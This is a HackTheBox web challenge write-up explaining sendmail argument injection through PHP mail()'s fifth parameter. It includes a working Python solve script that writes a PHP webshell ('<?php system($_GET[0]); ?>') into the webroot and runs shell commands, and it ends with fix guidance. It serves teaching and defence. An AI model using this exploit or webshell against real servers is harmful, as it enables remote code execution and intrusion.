---
title: "Letter Dispair"
date: 2027-05-26 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, php, argument-injection, sendmail, rce]
description: "An Easy Web challenge that is pure PHP source review. A mass-mailer builds mail()'s 5th argument as \"-f$from_email\" straight from user input, filtering only CRLF — so a space lets us inject sendmail's -X flag, log the whole SMTP transaction (including a PHP-tag Subject) into a .php file in the webroot, and turn that log into a webshell."
---

## Overview

Letter Dispair is an Easy [Web](https://cwe.mitre.org/data/definitions/88.html) challenge, and it is entirely a source-review puzzle. An open directory index hands us both the running mailer and its source. The mailer passes a user-controlled "From" address into PHP's `mail()` as the `$additional_params` argument, which is appended verbatim to the `sendmail` command line. With only a CRLF filter in the way, a single space lets us inject sendmail flags — and `-X` logs the entire SMTP transaction (headers and all) to a file of our choosing. Point it at a `.php` file in the webroot, smuggle a PHP tag through the un-sanitised Subject header, and the log file becomes a webshell.

## The technique

The app is a "Dispair PHP Mailer". Reading the leaked source, every send ends in:

```php
return mail($to, $subject, $this->output, implode($this->lf, $headers), "-f$from_addr");
```

PHP's `mail()` takes a 5th `$additional_params` argument that it appends straight onto the
`sendmail` command line. Here it is built as `"-f$from_addr"` where `$from_addr` is just
`$_POST['from_email']`. The only validation is a CRLF guard:

```php
foreach (["\n", "\r"] as $line_ending) {
    foreach ([$to_name, $to_addr, $subject, $from_name, $from_addr] as $header_value) {
        if (false !== strstr($header_value, $line_ending)) return false;
    }
}
```

That blocks header injection but never blocks **spaces** — so anything after a space in
`from_email` becomes an extra `sendmail` argument. This is classic [argument injection](https://cwe.mitre.org/data/definitions/88.html) (CWE-88).

Two sendmail flags weaponise it:

- `-OQueueDirectory=/tmp` — give the unprivileged worker a writable mail queue.
- `-X<path>` — log the **entire** SMTP transaction (all headers + body) to `<path>`.

Aim `-X` at a `.php` file under the webroot and sendmail writes a file PHP will execute. The PHP
payload must reach the log un-mangled: the message *body* is run through `strip_tags()` (which eats
`<?php ?>`), but the **Subject header is not** — so the webshell rides in the subject.

## Solution

Send one request that injects the `-X` log path and seeds the Subject with a PHP tag, then request
the dropped file. The working `solve.py`:

```python
import sys, requests
BASE  = sys.argv[1] if len(sys.argv) > 1 else "http://TARGET:PORT"
SHELL = "/var/www/html/x.php"

def deliver():
    data = {
        "from_email": f"a@a.htb -OQueueDirectory=/tmp -X{SHELL}",  # space => sendmail flags
        "from_name":  "x",
        "subject":    "<?php system($_GET[0]); ?>",                # NOT strip_tags'd
        "email_body": "hi",
        "email_list": "victim@moi.gov.htb",
    }
    requests.post(f"{BASE}/mailer.php", data=data,
                  files={"attachment": ("", "", "application/octet-stream")}, timeout=20)

def run(cmd):
    return requests.get(f"{BASE}/x.php", params={"0": cmd}, timeout=20).text

if __name__ == "__main__":
    deliver()
    print(run("cat /flag.txt"))
```

Running it drops `/var/www/html/x.php` (the sendmail debug log, with our `Subject: <?php ... ?>`
line inside it) and then `GET /x.php?0=cat /flag.txt` executes the tag and prints the flag inline:

```
HTB{...}
```

## Why it worked

PHP escapes the *values* inside `$additional_params`, but it still lets the caller **prepend extra
command-line flags**. So any user-controlled envelope sender (`-f`) is a sendmail
argument-injection primitive, and `-X` upgrades it from "set the sender" to "write an arbitrary file
as the web user" — i.e. remote code execution. The CRLF-only filter is the classic insufficient
defence: it stops header injection but does nothing about option injection via spaces.

## Fix / defense

Never derive `mail()`'s 5th argument from user input. Validate the address and drop the param:

```php
$from = $_POST['from_email'];
if (!filter_var($from, FILTER_VALIDATE_EMAIL)) die('bad sender');
mail($to, $subject, $body, $headers);   // no user-controlled params
```

Better still, use a maintained library (PHPMailer / Symfony Mailer) instead of the raw `mail()`
builtin, and run PHP-FPM under a user that cannot write into the document root.
